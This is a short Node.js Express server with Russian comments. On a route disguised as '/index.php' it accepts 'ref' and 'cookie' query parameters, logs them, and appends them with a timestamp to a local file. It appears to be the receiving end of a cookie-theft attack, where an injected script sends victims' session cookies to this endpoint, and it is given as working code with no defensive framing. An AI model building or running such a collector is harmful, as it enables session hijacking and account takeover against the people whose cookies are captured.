const express = require('express');
const fs = require('fs');
const app = express();
const port = 3000;

// Маршрут для получения данных
app.get('/index.php', (req, res) => {
    const referrer = req.query.ref;
    const cookies = req.query.cookie;

    console.log('Referrer:', referrer);
    console.log('Cookies:', cookies);

    // Разбиваем cookie на отдельные части, если необходимо
    const cookiesArray = cookies ? cookies.split(';').map(cookie => cookie.trim()) : [];

    // Форматируем данные для записи в файл
    const data = {
        timestamp: new Date().toISOString(),
        referrer: referrer,
        cookies: cookiesArray
    };

    // Запись данных в файл
    fs.appendFile('data.txt', JSON.stringify(data) + '\n', (err) => {
        if (err) {
            console.error('Failed to write data to file', err);
            res.status(500).send('Internal Server Error');
            return;
        }
        res.send('Data received and saved');
    });
});

// Запуск сервера
app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});

